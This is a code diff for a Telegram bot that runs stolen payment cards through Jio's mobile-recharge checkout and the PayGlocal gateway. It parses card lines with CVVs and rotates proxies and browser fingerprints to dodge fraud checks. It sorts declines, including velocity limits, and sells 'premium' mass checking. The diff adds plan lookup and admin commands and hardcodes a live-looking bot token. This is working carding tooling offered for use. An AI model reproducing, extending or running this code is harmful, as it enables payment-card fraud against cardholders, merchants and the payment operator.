@@ -1,4 +1,4 @@
-# Jio Recharge Bot — full version with decline classification
+# Jio Recharge Bot — full version, all fixes
 import telebot, re, time, os, sys, json, threading, random, datetime
 from concurrent.futures import ThreadPoolExecutor
 from curl_cffi import requests
@@ -9,8 +9,8 @@ except:
     pass
 
 # ================= CONFIG =================
-BOT_TOKEN = os.getenv('BOT_TOKEN', '8854376849:AAEk1bQAx_KbzpWsRxdyilL6qILYRqxj4dc')
-ADMIN_ID = int(os.getenv('ADMIN_ID', '8752143085'))
+BOT_TOKEN = '8854376849:AAEk1bQAx_KbzpWsRxdyilL6qILYRqxj4dc'
+ADMIN_ID = 8752143085
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # ================= FILES =================
@@ -65,6 +65,47 @@ def add_user(uid):
         if str(uid) not in users:
             with open(USERS_FILE, 'a') as f: f.write(str(uid) + '\n')
     except: pass
+
+def parse_duration(dur):
+    dur = dur.lower().strip()
+    now = time.time()
+    if dur in ('lifetime', 'life', 'forever', 'inf', '0'):
+        return 0
+    try:
+        if dur.endswith('mo'): return now + int(dur[:-2]) * 86400 * 30
+        if dur.endswith('s'): return now + int(dur[:-1])
+        if dur.endswith('m'): return now + int(dur[:-1]) * 60
+        if dur.endswith('h'): return now + int(dur[:-1]) * 3600
+        if dur.endswith('d'): return now + int(dur[:-1]) * 86400
+        if dur.endswith('w'): return now + int(dur[:-1]) * 86400 * 7
+        if dur.endswith('y'): return now + int(dur[:-1]) * 86400 * 365
+        return now + int(dur) * 86400
+    except:
+        return None
+
+def add_premium(tid, exp):
+    tid = str(tid).strip()
+    try:
+        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
+        with open(PREMIUM_FILE, 'w') as f:
+            for l in lines:
+                if not l.startswith(tid + "|"): f.write(l)
+        with open(PREMIUM_FILE, 'a') as f:
+            f.write(f"{tid}|{exp}\n")
+        return True
+    except Exception as e:
+        print(f"add_premium error: {e}")
+        return False
+
+def remove_premium(tid):
+    tid = str(tid).strip()
+    try:
+        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
+        with open(PREMIUM_FILE, 'w') as f:
+            for l in lines:
+                if not l.startswith(tid + "|"): f.write(l)
+        return True
+    except: return False
 
 # ================= PROXY =================
 proxy_list = []
@@ -204,18 +245,75 @@ LANGS = ["en-US,en;q=0.9","en-GB,en;q=0.9,en-US;q=0.8","en-IN,en;q=0.9,en-US;q=0
 def ts(): return str(int(time.time()*1000))
 
 def iter_plans(pj):
-    for cat in pj.get("planCategories") or []:
-        for sub in cat.get("subCategories") or []:
-            for plan in sub.get("plans") or []:
-                if plan.get("key"):
-                    yield {"key":plan["key"],"amount":float(plan.get("amount") or 0),
-                           "name":plan.get("name") or plan.get("planName") or "",
-                           "category":cat.get("type") or "","validity":plan.get("validity") or ""}
+    """Robust plan iterator — handles multiple JSON shapes recursively."""
+    seen = set()
+
+    def walk(node):
+        if isinstance(node, dict):
+            key = node.get("key") or node.get("planKey")
+            if key:
+                amt = node.get("amount")
+                if amt is None:
+                    amt = node.get("planAmount") or node.get("price") or 0
+                try:
+                    amt_f = float(str(amt).replace(",", "").strip())
+                except:
+                    amt_f = 0.0
+                name = node.get("name") or node.get("planName") or node.get("plan_name") or ""
+                cat = node.get("category") or node.get("type") or ""
+                validity = node.get("validity") or node.get("validityDays") or ""
+                sig = (str(key), amt_f)
+                if sig not in seen:
+                    seen.add(sig)
+                    yield {
+                        "key": key,
+                        "amount": amt_f,
+                        "name": name,
+                        "category": cat,
+                        "validity": validity,
+                        "raw": node,
+                    }
+            for v in node.values():
+                yield from walk(v)
+        elif isinstance(node, list):
+            for item in node:
+                yield from walk(item)
+
+    yield from walk(pj)
+
 
 def plan_by_amount(pj, amount):
-    for p in iter_plans(pj):
-        if p["amount"] == float(amount): return p
-    return None
+    """Find closest plan. Tries exact, ±1, ±10%, then nearest."""
+    target = float(amount)
+    plans = list(iter_plans(pj))
+    if not plans:
+        return None
+
+    for p in plans:
+        if abs(p["amount"] - target) < 0.001:
+            return p
+
+    for p in plans:
+        if abs(p["amount"] - target) <= 1:
+            return p
+
+    tolerance = max(target * 0.1, 2)
+    for p in plans:
+        if abs(p["amount"] - target) <= tolerance:
+            return p
+
+    return min(plans, key=lambda p: abs(p["amount"] - target))
+
+
+def list_all_plans(pj):
+    """Return sorted list of unique plans for debugging."""
+    plans = list(iter_plans(pj))
+    seen_amounts = {}
+    for p in plans:
+        if p["amount"] not in seen_amounts:
+            seen_amounts[p["amount"]] = p
+    return sorted(seen_amounts.values(), key=lambda x: x["amount"])
+
 
 def parse_card_line(line):
     parts = re.split(r"[|/:\s]+", line.strip())
@@ -232,7 +330,6 @@ def card_label(card):
     return f"{card['pan']}|{card['exp_month']}|{card['exp_year'][-2:]}|{card['cvv']}"
 
 def classify_decline(status, message, reason):
-    """Return (status_key, formatted_message)."""
     combined = f"{status} {message} {reason}".lower()
 
     if status in ("SUCCESS", "APPROVED"):
@@ -276,7 +373,8 @@ def classify_decline(status, message, reason):
         return "velocity", f"Velocity Limit — {message[:80]}"
 
     if any(k in combined for k in ["processor", "network", "timeout", "gateway",
-                                    "system error", "try again", "temporarily"]):
+                                    "system error", "try again", "temporarily",
+                                    "something went wrong"]):
         return "processor_error", f"Processor Error — {message[:80]}"
 
     if status == "ISSUER_DECLINE":
@@ -384,13 +482,19 @@ def jio_check(phone, amount, card, proxy_str=None):
         except Exception as e:
             return "error", f"Plans fetch failed: {str(e)[:80]}", meta
 
+        # 5. Pick plan
         picked = plan_by_amount(plans_json, amount)
         if not picked:
-            return "error", f"No plan for Rs {amount}", meta
+            all_p = list_all_plans(plans_json)
+            if all_p:
+                avail = ", ".join(f"₹{int(p['amount'])}" for p in all_p[:10])
+                return "error", f"No plan for ₹{amount}. Available: {avail}", meta
+            return "error", f"No plans found for this number", meta
+
         plan_key = picked["key"]
         meta["plan"] = (picked["name"] or picked["category"] or "")[:35]
 
-        # 5. Buy
+        # 6. Buy
         try:
             r = spost("https://www.jio.com/api/jio-recharge-service/recharge/buy",
                 headers=jh(plans_ref, ct="application/json", origin="https://www.jio.com",
@@ -401,7 +505,7 @@ def jio_check(phone, amount, card, proxy_str=None):
         except Exception as e:
             return "error", f"Buy failed: {str(e)[:80]}", meta
 
-        # 6. Pay
+        # 7. Pay
         try:
             r = spost("https://www.jio.com/api/jio-recharge-service/recharge/pay",
                 headers=jh(plans_ref, ct="application/json", origin="https://www.jio.com",
@@ -413,7 +517,7 @@ def jio_check(phone, amount, card, proxy_str=None):
         except Exception as e:
             return "error", f"Pay init failed: {str(e)[:80]}", meta
 
-        # 7. Redirect
+        # 8. Redirect
         try:
             r = sget(payment_url, headers=jh(plans_ref, extra={
                 "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -427,7 +531,7 @@ def jio_check(phone, amount, card, proxy_str=None):
         except Exception as e:
             return "error", f"Redirect failed: {str(e)[:80]}", meta
 
-        # 8. Pay portal
+        # 9. Pay portal
         try:
             r = spost(pay_form_url, headers=jh("https://www.jio.com/",
                 ct="application/x-www-form-urlencoded", origin="https://www.jio.com",
@@ -439,7 +543,7 @@ def jio_check(phone, amount, card, proxy_str=None):
         except Exception as e:
             return "error", f"Pay portal failed: {str(e)[:80]}", meta
 
-        # 9. Authorize
+        # 10. Authorize
         try:
             r = spost("https://pay.jio.com/jiopg/v1/authorize-card-operation",
                 headers=jh(pay_jio_ref, ct="application/json", origin="https://pay.jio.com",
@@ -453,7 +557,7 @@ def jio_check(phone, amount, card, proxy_str=None):
         except Exception as e:
             return "error", f"Auth failed: {str(e)[:80]}", meta
 
-        # 10. Card confirm
+        # 11. Card confirm
         try:
             r = spost("https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation",
                 headers=jh(pay_jio_ref, ct="application/json", origin="https://pay.jio.com",
@@ -481,7 +585,7 @@ def jio_check(phone, amount, card, proxy_str=None):
         if not html_form:
             return "failed", "No bank form", meta
 
-        # 11. Bank connect
+        # 12. Bank connect
         try:
             ea = re.search(r"action='([^']+)'", html_form)
             ei = re.findall(r"name='([^']+)'\s+value='([^']*)'", html_form)
@@ -518,7 +622,7 @@ def jio_check(phone, amount, card, proxy_str=None):
         gl_token = m.group(1)
         gl_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"
 
-        # 12. PG redirect
+        # 13. PG redirect
         try:
             r = sget("https://api.payglocal.com/gl/v2/payments/redirect/dc",
                 params={"x-gl-token": gl_token},
@@ -531,7 +635,7 @@ def jio_check(phone, amount, card, proxy_str=None):
         except Exception as e:
             return "error", f"PG redirect failed: {str(e)[:80]}", meta
 
-        # 13. Payment init
+        # 14. Payment init
         try:
             r = spost("https://api.payglocal.com/gl/v2/payments/pd/paynow",
                 params={"x-gl-token": gl_token},
@@ -545,7 +649,7 @@ def jio_check(phone, amount, card, proxy_str=None):
         except Exception as e:
             return "error", f"Paynow failed: {str(e)[:80]}", meta
 
-        # 14. Risk check
+        # 15. Risk check
         try:
             r = spost("https://api.payglocal.com/gl/v1/payments/risk/fp",
                 params={"x-gl-token": gl_token},
@@ -558,7 +662,7 @@ def jio_check(phone, amount, card, proxy_str=None):
         except Exception as e:
             return "error", f"Risk check failed: {str(e)[:80]}", meta
 
-        # 15. Charge
+        # 16. Charge
         time.sleep(random.uniform(0.5, 1.2))
         try:
             r = spost("https://api.payglocal.com/gl/v2/payments/dc/ipay",
@@ -619,9 +723,58 @@ def start(message):
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"⚡ /jio — Single check\n"
         f"📦 /mjio — Mass check\n"
+        f"📋 /plans — View available plans\n"
         f"🌐 /proxy — Manage proxies\n"
         f"👤 /info — Account info",
         parse_mode="HTML")
+
+@bot.message_handler(commands=['plans'])
+def show_plans(message):
+    uid = message.from_user.id
+    if is_banned(uid):
+        bot.reply_to(message, "❌ <b>You are banned.</b>", parse_mode="HTML"); return
+    add_user(uid)
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message,
+            "📝 <b>Usage:</b> <code>/plans &lt;phone&gt;</code>\n"
+            "Example: <code>/plans 9876543210</code>",
+            parse_mode="HTML"); return
+    phone = args[1]
+    msg = bot.reply_to(message, f"⏳ Fetching plans for <code>{phone}</code>...", parse_mode="HTML")
+    try:
+        pf = random.choice(PROFILES)
+        lg = random.choice(LANGS)
+        UA = pf["ua"]; IMP = pf["imp"]; SEC = pf["ch"]; PLAT = pf["plat"]; MOB = pf["mob"]
+        s = requests.Session(impersonate=IMP, verify=False)
+        s.get("https://www.jio.com/", headers={"User-Agent": UA}, timeout=30)
+        r = s.get(f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{phone}",
+                  headers={"Accept":"application/json","Referer":"https://www.jio.com/","User-Agent": UA},
+                  timeout=45)
+        d = r.json()
+        if d.get("errorMessage") == "NOT_SUBSCRIBED_USER":
+            bot.edit_message_text(f"❌ <b>Not a Jio number</b>", message.chat.id, msg.message_id, parse_mode="HTML")
+            return
+        primary = d.get("primaryService") or {}
+        bt = d.get("billingType") or primary.get("billingType") or "PREPAID"
+        ref = f"https://www.jio.com/selfcare/recharge/mobility/plans/?serviceId={phone}"
+        r2 = s.get(f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{phone}",
+                   headers={"Accept":"*/*","Referer":ref,"User-Agent": UA}, timeout=45)
+        pj = r2.json()
+        plans = list_all_plans(pj)
+        if not plans:
+            bot.edit_message_text(f"❌ <b>No plans found</b>", message.chat.id, msg.message_id, parse_mode="HTML")
+            return
+        lines = [f"📋 <b>Plans for <code>{phone}</code></b> ({bt})", "━━━━━━━━━━━━━━━━━━━━"]
+        for p in plans[:40]:
+            amt = int(p["amount"])
+            name = (p["name"] or p["category"] or "")[:30]
+            lines.append(f"₹{amt} ━ {name}")
+        if len(plans) > 40:
+            lines.append(f"... and {len(plans)-40} more")
+        bot.edit_message_text("\n".join(lines), message.chat.id, msg.message_id, parse_mode="HTML")
+    except Exception as e:
+        bot.edit_message_text(f"❌ <b>Error:</b> {str(e)[:100]}", message.chat.id, msg.message_id, parse_mode="HTML")
 
 @bot.message_handler(commands=['jio'])
 def jio_single(message):
@@ -691,7 +844,7 @@ def mjio_mass(message):
 
     limit = ADMIN_LIMIT if is_admin(uid) else (PREMIUM_LIMIT if is_premium(uid) else FREE_LIMIT)
     if limit == 0:
-        bot.reply_to(message, "⚠️ <b>Free users cannot use mass check.</b>", parse_mode="HTML"); return
+        bot.reply_to(message, "⚠️ <b>Free users cannot use mass check.</b>\nAsk admin for premium.", parse_mode="HTML"); return
     if ACTIVE_USERS_MPP.get(uid):
         bot.reply_to(message, "⚠️ <b>Mass check already running.</b>", parse_mode="HTML"); return
 
@@ -894,38 +1047,42 @@ def user_info(message):
         parse_mode="HTML")
 
 # ================= ADMIN =================
-@bot.message_handler(commands=['addpremium'])
+@bot.message_handler(commands=['addpremium', 'premium'])
 def add_prem(message):
     if not is_admin(message.from_user.id):
         bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
     try:
         p = message.text.split()
+        if len(p) < 3:
+            bot.reply_to(message, "📝 <code>/addpremium &lt;id&gt; &lt;duration&gt;</code>\n"
+                                  "Duration: <code>1d, 7d, 30d, 1h, lifetime</code>",
+                         parse_mode="HTML"); return
         tid, dur = p[1], p[2]
-        now = time.time()
-        if dur == 'lifetime': exp = 0
-        elif dur.endswith('d'): exp = now + int(dur[:-1]) * 86400
-        elif dur.endswith('h'): exp = now + int(dur[:-1]) * 3600
-        elif dur.endswith('m'): exp = now + int(dur[:-1]) * 60
-        elif dur.endswith('s'): exp = now + int(dur[:-1])
-        else: raise Exception()
-        with open(PREMIUM_FILE, 'a') as f: f.write(f"{tid}|{exp}\n")
-        bot.reply_to(message, f"✅ <b>Premium added</b> ➜ {tid} ({dur})", parse_mode="HTML")
-        try: bot.send_message(int(tid), f"👑 <b>Premium added!</b> Duration: {dur}", parse_mode="HTML")
-        except: pass
-    except:
-        bot.reply_to(message, "📝 <code>/addpremium &lt;id&gt; &lt;1d/lifetime&gt;</code>", parse_mode="HTML")
+        exp = parse_duration(dur)
+        if exp is None:
+            bot.reply_to(message, f"❌ <b>Invalid duration:</b> {dur}\nUse: 1d, 7d, 30d, 1h, lifetime", parse_mode="HTML"); return
+        if add_premium(tid, exp):
+            dur_str = "Lifetime" if exp == 0 else dur
+            bot.reply_to(message, f"✅ <b>Premium added</b> ➜ <code>{tid}</code> ({dur_str})", parse_mode="HTML")
+            try: bot.send_message(int(tid), f"👑 <b>Premium added!</b>\nDuration: {dur_str}\nYou can now use /mjio.", parse_mode="HTML")
+            except: pass
+        else:
+            bot.reply_to(message, "❌ <b>Failed to add premium.</b>", parse_mode="HTML")
+    except Exception as e:
+        bot.reply_to(message, f"❌ <b>Error:</b> {str(e)[:100]}", parse_mode="HTML")
 
-@bot.message_handler(commands=['rmpremium'])
+@bot.message_handler(commands=['rmpremium', 'unpremium'])
 def rm_prem(message):
     if not is_admin(message.from_user.id):
         bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
     try:
         tid = message.text.split()[1]
-        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
-        with open(PREMIUM_FILE, 'w') as f:
-            for l in lines:
-                if not l.startswith(tid + "|"): f.write(l)
-        bot.reply_to(message, f"✅ <b>Premium removed</b> ➜ {tid}", parse_mode="HTML")
+        if remove_premium(tid):
+            bot.reply_to(message, f"✅ <b>Premium removed</b> ➜ <code>{tid}</code>", parse_mode="HTML")
+            try: bot.send_message(int(tid), "⚠️ <b>Your Premium has been removed.</b>", parse_mode="HTML")
+            except: pass
+        else:
+            bot.reply_to(message, "❌ <b>Failed.</b>", parse_mode="HTML")
     except: bot.reply_to(message, "📝 <code>/rmpremium &lt;id&gt;</code>", parse_mode="HTML")
 
 @bot.message_handler(commands=['ban'])
@@ -936,15 +1093,13 @@ def ban_user(message):
         p = message.text.split()
         tid = p[1]
         dur = p[2] if len(p) > 2 else 'lifetime'
-        now = time.time()
-        if dur == 'lifetime': exp = 0
-        elif dur.endswith('d'): exp = now + int(dur[:-1]) * 86400
-        elif dur.endswith('h'): exp = now + int(dur[:-1]) * 3600
-        elif dur.endswith('m'): exp = now + int(dur[:-1]) * 60
-        elif dur.endswith('s'): exp = now + int(dur[:-1])
-        else: raise Exception()
+        exp = parse_duration(dur)
+        if exp is None:
+            bot.reply_to(message, "❌ <b>Invalid duration.</b>", parse_mode="HTML"); return
         with open(BANNED_FILE, 'a') as f: f.write(f"{tid}|{exp}\n")
-        bot.reply_to(message, f"✅ <b>Banned</b> ➜ {tid} ({dur})", parse_mode="HTML")
+        bot.reply_to(message, f"✅ <b>Banned</b> ➜ <code>{tid}</code> ({dur})", parse_mode="HTML")
+        try: bot.send_message(int(tid), f"❌ You are banned ({dur})", parse_mode="HTML")
+        except: pass
     except: bot.reply_to(message, "📝 <code>/ban &lt;id&gt; &lt;duration&gt;</code>", parse_mode="HTML")
 
 @bot.message_handler(commands=['unban'])
@@ -957,7 +1112,9 @@ def unban_user(message):
         with open(BANNED_FILE, 'w') as f:
             for l in lines:
                 if not l.startswith(tid + "|"): f.write(l)
-        bot.reply_to(message, f"✅ <b>Unbanned</b> ➜ {tid}", parse_mode="HTML")
+        bot.reply_to(message, f"✅ <b>Unbanned</b> ➜ <code>{tid}</code>", parse_mode="HTML")
+        try: bot.send_message(int(tid), "✅ You are unbanned.", parse_mode="HTML")
+        except: pass
     except: bot.reply_to(message, "📝 <code>/unban &lt;id&gt;</code>", parse_mode="HTML")
 
 @bot.message_handler(commands=['stats'])
